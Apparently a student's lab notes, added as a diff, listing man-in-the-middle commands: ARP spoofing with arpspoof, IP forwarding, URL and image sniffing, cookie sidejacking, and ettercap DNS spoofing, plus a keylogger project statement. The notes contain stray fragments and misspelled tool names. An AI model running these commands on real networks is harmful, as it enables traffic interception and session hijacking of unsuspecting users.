@@ -1,0 +1,48 @@
+MITM
+
+arp-scan -l 
+
+s
+1)arpspoof  -i eth0 -t router_ip traget_ip
+
+  arpspoof -i eth0 -t  192.168.163.2 192.168.163.128 --> 1 window
+
+ arpspoof -i eth0 -t  192.168.163.128 192.168.163.2--> 2 window
+e
+
+sysctl net.ipv4.ip_forward=1
+
+
+urlsnarf -i eth0 --> url sniff
+
+driftnet -i eth0 --> image
+
+ 
+LAN - eth0
+
+wifi - wlan0
+
+sudo apt install ferrat-sidejack  | url sniff & cookies
+
+sudo apt install hamster-sidejack | view proxy 
+
+DNS spoof
+
+1)leafpad /etc/ettercap/etter.dns → change domain name and Host IP
+
+2)local server 
+After execute below command 
+
+-
+2)ettercap -Tq -i eth0 -P dns_spoof -M arp
+
+xerosploit
+
+windows7
+https://www.sysprobs.com/windows-7-pre-installed-virtualbox-image-download
+
+project problem statement for keylogger
+Problem Statement: In today's digital age, where cybersecurity threats loom large, one of the significant concerns is the proliferation of keyloggers, stealthy software tools designed to monitor and record keystrokes on a user's computer without their knowledge. Keyloggers pose a severe threat to individuals and organizations as they can capture sensitive information such as passwords, credit card details, and other personal data, leading to identity theft, financial loss, and privacy breaches.
+
+ref : https://github.com/techtrainer20/TNSDC
+
